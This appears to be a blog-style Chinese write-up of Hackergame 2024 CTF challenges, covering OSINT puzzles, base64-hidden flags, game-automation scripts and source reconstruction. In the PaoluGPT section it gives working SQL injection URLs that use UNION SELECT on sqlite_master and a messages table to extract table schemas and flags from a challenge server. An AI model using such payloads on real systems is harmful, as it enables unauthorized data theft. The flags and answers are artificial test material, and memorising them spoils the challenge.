# Aristore writeup

> Blog post URL: [Hackergame 2024 Write Up | Aristore](https://www.aristore.top/posts/Hackergame_2024_WP/)



## 签到题

方法太多了，我是模拟输入过的。



## 喜欢做签到的 CTFer 你们好呀

根据题目有两个 flag 就藏在中国科学技术大学校内 CTF 战队的招新主页里那就前往[招新主页](https://www.nebuu.la/)，发现了一个像终端的页面。先`ls`一下找到了`Welcome-to-USTC-Nebula-s-Homepage/`和`and-We-are-Waiting-for-U/`这两个目录，再分别`ls`一下发现了`and-We-are-Waiting-for-U/`下有`.flag`，但是尝试`cat`打开时发现没有权限。因此抓包，在这个[js文件](https://www.nebuu.la/_next/static/chunks/pages/index-5c589ff418560b46.js)里找到了2个`flag`这一关键词。在第二个“flag”附近找到了这个东西`atob("ZmxhZ3swa18xNzVfYV9oMWRkM25fczNjM3J0X2YxNGdfX19wbGVhc2Vfam9pbl91c191c3RjX25lYnVsYV9hbkRfdHdvX21hSm9yX3JlcXVpcmVtZW50c19hUmVfc2hvd25fc29tZXdoZXJlX2Vsc2V9")`，这是一个将 base64 解码的操作，直接丢到浏览器的控制台运行得到第二个flag。

```flag
flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}
```

回到这个js文件搜索`atob`,就能找到这个`atob("RkxBRz1mbGFne2FjdHVhbGx5X3RoZXJlc19hbm90aGVyX2ZsYWdfaGVyZV90cllfdG9fZjFuRF8xdF95MHVyc2VsZl9fX2pvaW5fdXNfdXN0Y19uZWJ1bGF9")`，重复上述解码操作得到第一个flag。

```flag
flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
```



## 猫咪问答（Hackergame 十周年纪念版）

1. 官网翻看活动记录[信息安全大赛 Hackergame - LUG @ USTC](https://lug.ustc.edu.cn/wiki/lug/events/hackergame/)找到了第二届也就是2015年的存档[第二届安全竞赛（存档）](https://lug.ustc.edu.cn/wiki/sec/contest.html)。比赛时间安排下面找到“ 10 月 17 日 周六晚上 19:30 ==3A204== 网络攻防技巧讲座”。

2. 翻看近几年官方wp发现[ustclug/hackergame2019-writeups](https://github.com/ustclug/hackergame2019-writeups/)2019年有28题是最接近的。再翻看2019年的活动记录[中国科学技术大学第六届信息安全大赛圆满结束 - LUG @ USTC](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)就能找到”经统计，在本次比赛中，总共有 ==2682== 人注册“。

3. 直接找到2018的wp[ustclug/hackergame2018-writeups](https://github.com/ustclug/hackergame2018-writeups)，翻到最下面看到花絮[其他花絮](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)就能发现：“==程序员的自我修养==”已经成为了图书馆本月热搜词的第一名

4. 翻看论文[USENIXSecurity2024-FakeBehalf-Final-Version.pdf](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)作者在16个电子邮件服务提供商和20个客户端的组合上进行了实验，总共有==336==种组合（包括16个目标提供商的网络界面）。

5. 直接找到这个[commit](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)不难发现==6e90b6==75cf942e50c70e8394dfb5862975c3b3b2

6. 代码如下

```python
from transformers import PreTrainedTokenizerFast

path = "D:/Solution" # 这里改成你自己的目录

def read_text_from_file(file_path):

    with open(file_path, 'r', encoding='utf-8') as file:
        text = file.read()
    return text

def count_tokens(text, tokenizer_path=f'{path}/tokenizer.json'): # tokenizer.json 要先到hf下载

    tokenizer = PreTrainedTokenizerFast(tokenizer_file=tokenizer_path)

    tokens = tokenizer.tokenize(text)

    num_tokens = len(tokens)
    
    return num_tokens

# 主函数
if __name__ == "__main__":

    text_file_path = f'{path}/test.txt' # 这里的 test.txt 存储的是网页的 HTML 源代码
    text = read_text_from_file(text_file_path)

    num_tokens = count_tokens(text)
    print(f"总共有 {num_tokens} 个tokens")
```

- 要先把[tokenizer.json](https://huggingface.co/meta-llama/Meta-Llama-3-70B/blob/main/tokenizer.json)下载下来，如果提示没有权限要先向向官方申请，过几分钟就通过了
- 然后把 HTML 源代码 存到本地
- 最后根据实际改动上面的代码，例如`path`和`test.txt`
- 事实上这题我运行出来的结果是 1834 。但是把这个数周围的都试试最后发现答案是 ==1833== 。

最后得到两个flag:

```flag
flag{4_gØ0D_cat_1s_7H3_CA7_ωHØ_c4n_P4s$_7H3_qบIz}
```

```flag
flag{teN_yeαrS_Oƒ_Hα©KeRG4M3_OMEd37ou_w17H_nEK0_qU12}
```



## 打不开的盒

附件下载下来，搜`stl在线查看`打开附件。放大看盒子内部找到flag:

```flag
flag{Dr4W_Us!nG_fR3E_C4D!!w0W}
```



## 旅行照片 4.0

- 1-2题

根据图片在地图搜索 `科里科气科创驿站`  ，找到 `科里科气科创驿站(科大站)` 。放大地图可以看到距离==东校区西门==更近。

搜索引擎搜索 `科大 ACG 音乐会` 找到[视频](https://www.bilibili.com/video/BV1RZ421p77C/)发现发布时间是 *2024-05-24* 。紧接着查看该视频发布账号[中科大LEO动漫协会](https://space.bilibili.com/7021308)在2024年5月附近发布的动态发现这一条[中科大LEO动漫协会的动态](https://www.bilibili.com/opus/930934582351495204)，图片里能找到==20240519==。

```flag
 flag{5UB5CR1B3_T0_L30_CH4N_0N_B1L1B1L1_PLZ_1af0de951a}
```

- 3-4题

放大图片看见垃圾桶的`六安`，猜测拍摄地点在六安。再看图片中的跑道极具特色，进而搜索`六安 跑道`找到[这篇文章](https://www.sohu.com/a/498987928_121123834)，将文中的==中央公园==填入即可。

百度搜图找到图中位置应该在`三峡大坝`附近。搜索`三峡大坝 旅游攻略`找到的攻略里提到了==坛子岭==这一三字地点，根据题目提示三字汉字，先填进去发现这就是答案。

```flag
 flag{D3T41LS_M4TT3R_1F_R3V3RS3_S34RCH_1S_1MP0SS1BL3_4deab4f814}
```

- 5-6题

我对动车并没有很了解。根据题目提示`有辆很标志性的……四编组动车`，搜索`四编组动车`，找到了百度百科的这篇介绍[CRH6F-A型动车组](https://baike.baidu.com/item/crh6f-a型动车组/64494821)，里面的`怀密号`与图中的四编组动车一致，可知拍摄地点在`北京市郊铁路怀柔—密云线`上，因此第6题答案为==CRH6F-A==。

最后挨个找离怀密线最近的且名字为三个字的医院，找到了北京北动车运用所附近的`北京积水潭医院(新街口院区)`，因此第6题答案为==积水潭医院==。

```flag
flag{1_C4NT_C0NT1NU3_TH3_5T0RY_4NYM0R3_50M30N3_PLZ_H3LP_6023e19b2c}
```



## 比大小王

我一开始写了一个Python脚本，结果被查出来了`{'message': '检测到异常提交'}`

```python
import requests
import json

initial_url = "http://202.38.93.141:12122/?token=..." # 这里改成自己的token
base_url = 'http://202.38.93.141:12122'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Referer': base_url,
    "Content-Type": "application/json"
}

session = requests.Session()

def get_page(url):
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error accessing initial page {url}: {e}")
        return None

def post_page(api,json):
    try:
        response = session.post(base_url+f'/{api}', headers=headers, json=json)
        return response.json()
    except requests.RequestException as e:
        print(f"Error accessing initial page /{api}: {e}")
        return None

def compair(game_data):
    inputs = []

    for value in game_data['values']:
        if value[0] > value[1]:
            inputs.append('>')
        elif value[0] < value[1]:
            inputs.append('<')
        else:
            inputs.append('=')
    
    submit_data = {
        "inputs": inputs
    }

    submit_json = json.dumps(submit_data)
    return submit_json

get_page(initial_url)
game_data = post_page('game',{})
submit_data = post_page('submit',compair(game_data))
print(submit_data)
```

后来让AI写了个油猴脚本模拟点击，结果速度只有对手一半快

```javascript
// ==UserScript==
// @name         比大小王
// @version      1
// @description  全自动脚本
// @author       Aristore
// @match        http://202.38.93.141:12122/*
// ==/UserScript==

(function() {

    function autoAnswer() {
        const answerButtonLessThan = document.getElementById('less-than');
        const answerButtonGreaterThan = document.getElementById('greater-than');
        const value1 = document.getElementById('value1').textContent;
        const value2 = document.getElementById('value2').textContent;

        if (value1 && value2) {
            if (parseInt(value1) < parseInt(value2)) {
                answerButtonLessThan.click();
            } else if (parseInt(value1) > parseInt(value2)) {
                answerButtonGreaterThan.click();
            }
        }
    }

    setInterval(autoAnswer, 1);
})();
```

最后让AI转换思路写了个半自动脚本，手动在开发者工具抓包`/game`拿到题目数据，复制粘贴传给脚本计算好后调用接口`/submit`提交

```javascript
// ==UserScript==
// @name         比大小王
// @version      2
// @description  半自动脚本
// @author       Aristore
// @match        http://202.38.93.141:12122/*
// ==/UserScript==

(function() {
    'use strict';

    // 创建输入框和按钮
    function createUI() {
        const container = document.createElement('div');
        container.style.position = 'fixed';
        container.style.top = '10px';
        container.style.left = '10px';
        container.style.backgroundColor = 'white';
        container.style.padding = '10px';
        container.style.border = '1px solid black';
        container.style.zIndex = '10000';

        const label = document.createElement('label');
        label.textContent = '输入数据:';

        const input = document.createElement('textarea');
        input.style.width = '300px';
        input.style.height = '150px';

        const button = document.createElement('button');
        button.textContent = '提交';
        button.onclick = () => processInput(input.value);

        container.appendChild(label);
        container.appendChild(input);
        container.appendChild(button);

        document.body.appendChild(container);
    }

    // 处理输入的数据
    function processInput(jsonData) {
        try {
            const data = JSON.parse(jsonData);
            if (data.startTime && Array.isArray(data.values)) {
                const inputs = computeAnswers(data.values);
                submitAnswers(inputs);
            } else {
                alert('输入的数据格式不正确，请确保包含 startTime 和 values 字段。');
            }
        } catch (error) {
            console.error('Failed to parse JSON data:', error);
            alert('输入的数据不是有效的 JSON 格式。');
        }
    }

    // 计算所有答案
    function computeAnswers(values) {
        return values.map(([value1, value2]) => value1 < value2 ? '<' : '>');
    }

    // 提交答案
    function submitAnswers(inputs) {
        fetch('/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ inputs }),
        })
        .then(response => response.json())
        .then(data => {
            if (data.message) {
                alert(data.message);
            } else {
                alert('提交成功！');
            }
        })
        .catch(error => {
            console.error('Failed to submit answers:', error);
            alert('提交失败，请刷新页面重试');
        });
    }

    // 主函数
    function main() {
        createUI();
    }

    // 页面加载完成后执行主函数
    window.addEventListener('load', main);
})();
```

然后flag就弹出来了

```flag
flag{1-am-The-hackeR-King-0F-C0mPARInG-nUMbeR$-zo24}
```



## PaoluGPT

第一问写个脚本遍历一下就出来了

```python
import requests
from bs4 import BeautifulSoup
import re

base_url = "https://xxxxxx.hack-challenge.lug.ustc.edu.cn:8443" # 这里改成实际的链接
initial_url = f"{base_url}/?token=..." # 这里改成自己的token

# 匹配
flag_pattern = re.compile(r'flag\{.*?\}')

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Referer': base_url
}

# 持会话状态
session = requests.Session()

def get_initial_page(url):
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error accessing initial page {url}: {e}")
        return None

def get_chat_links(html):
    soup = BeautifulSoup(html, 'html.parser')
    chat_links = []
    for link in soup.find_all('a', href=True):
        if '/view?conversation_id=' in link['href']:
            chat_links.append(link['href'])
    return chat_links

def fetch_and_search(url):
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 找flag
        flag_match = flag_pattern.search(soup.get_text())
        if flag_match:
            print(f"{flag_match.group(0)}")
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")

initial_html = get_initial_page(initial_url)

list_url = f"{base_url}/list"
list_html = get_initial_page(list_url)

chat_links = get_chat_links(list_html)

# 遍历聊天记录
for chat_link in chat_links:
    url = f"{base_url}{chat_link}"
    fetch_and_search(url)
```

```flag
flag{zU1_xiA0_de_11m_Pa0lule!!!_e6a8213eb7}
```

然后把附件下载下来之后发现在`/view`路由中，直接将用户提供的`conversation_id`参数拼接到SQL查询语句中，而没有进行任何验证或转义，这可能导致SQL注入攻击。

访问`http://链接/view?conversation_id=1' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --`就可以获取所有表名`message`。

访问`http://链接/view?conversation_id=1' UNION SELECT id, contents FROM messages WHERE contents LIKE '%flag%' --`获取包含flag的消息，在页底同样能拿到第一个flag。

然后访问`https://链接/view?conversation_id=1' UNION SELECT name, sql FROM sqlite_master WHERE type='table' AND name='messages' --`就可以获取`message`表的所有列名`CREATE TABLE messages (id text primary key, title text, contents text, shown boolean)`.

使用`LIKE`语句来搜索包含`flag`的内容：`https://链接/view?conversation_id=1' UNION SELECT title, contents FROM messages WHERE contents LIKE '%flag%' --`，在页底拿到第二个flag。

```flag
flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_83f2f8e703}
```



## 惜字如金3.0

1. 丢给AI还原

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, base64, flask, itertools, os, re                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A' 
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf                 
    assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return re.sub(pat, repl, input, flags=re.IGNORECASE)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__file__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = base64.b85encode(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.write(row)                                                       
            paths.append(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remove(path)                                                 
            except FileNotFoundError:                                           
                pass                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_a', __name__)                     
                                                                                
                                                                                
@bp.get('/answer_a.py')                                                         
def get() -> flask.Response:                                                    
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_a.py')                                                        
def post() -> flask.Response:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is None:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is None:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_a.txt', 'rb') as af:                                      
        answer_flag = base64.b85decode(af.read()).decode()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        assert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                

```

2. 先是像第1问一样解，到最后发现第7行的变量`poly`不知道要怎么解然后就不会了

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, base64, flask, itertools, os, re                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = '', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'B' 
    flip = sum(['b', 'B'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xdbeEaed4cF43, 0xFDFECeBdeeD9, 0xB7E85A4E5Dcd                 
    assert (u2, u1, u0) == (241818181881667, 279270832074457, 202208575380941)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return re.sub(pat, repl, input, flags=re.IGNORECASE)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__file__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = base64.b85encode(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.write(row)                                                       
            paths.append(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remove(path)                                                 
            except FileNotFoundError:                                           
                pass                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_b', __name__)                     
                                                                                
                                                                                
@bp.get('/answer_b.py')                                                         
def get() -> flask.Response:                                                    
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_b.py')                                                        
def post() -> flask.Response:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is None:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is None:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_b.txt', 'rb') as af:                                      
        answer_flag = base64.b85decode(af.read()).decode()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        assert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                

```



## 后记

本人是CTF新人，在几天前的强网杯被虐得不轻，没解出来一道，深受打击😰。偶然刷到Hackergame，发现活动还没结束遂果断参加（竟然有我能解出来的题我真的好感动😭😭😭）。明年有时间的话还来打 Hackergame😋。

没有图是因为懒(
